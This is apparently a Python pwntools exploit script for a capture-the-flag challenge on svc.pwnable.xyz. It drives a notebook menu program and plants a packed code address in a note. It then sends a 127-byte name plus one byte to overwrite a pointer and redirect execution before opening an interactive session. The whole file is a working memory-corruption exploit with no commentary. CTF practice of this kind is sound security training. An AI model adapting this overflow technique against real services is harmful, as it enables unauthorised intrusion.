from pwn import *

#s = process("./challenge")
s = remote("svc.pwnable.xyz",30035)

#pause()

s.recv(1024)
s.sendline("AAAA")

s.recvuntil("> ")
s.sendline("1")

s.recvuntil("size: ")
s.sendline("80")
s.recvuntil("Title: ")
s.sendline("AAAA")
s.recvuntil("Note: ")
s.sendline(p64(0x40092C)+"A"*56)

s.recvuntil("> ")
s.sendline("4")

s.recvuntil("Notebook name: ")
s.send("A"*127 + "\x50")

s.interactive()
